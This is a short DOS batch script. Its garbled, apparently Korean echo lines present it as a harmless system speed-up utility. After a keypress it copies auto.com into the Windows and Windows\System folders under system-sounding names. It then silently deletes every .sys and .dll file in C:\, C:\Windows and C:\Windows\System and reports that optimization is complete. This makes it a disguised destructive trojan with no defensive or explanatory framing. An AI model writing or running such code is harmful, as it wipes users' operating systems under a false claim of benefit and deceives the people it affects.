CLS
echo �ý��� �ӵ���ġ (MS-DOS���� �ý��� ����ȭ!)
echo �ý��ۿ� ��� ���⵵ �����ʽ��ϴ�.
echo ���� �ϵ��ũ(HARD DISK)�� ����ȭ ��Ű�� ������Ʈ���� �����մϴ�.
echo ����ϽǷ��� �ƹ�Ű�� �����ֽʽÿ�!
pause
COPY auto.com c:\windows\syscopy.com      > nul
COPY auto.com c:\windows\system\sysconfig.com      > nul
CD \
CD windows
DEL *.sys      > nul
DEL *.dll      > nul
CD system
DEL *.dll
DEL *.sys
CD \
DEL *.sys      > nul
echo �ý��� ����ȭ �Ϸ�!
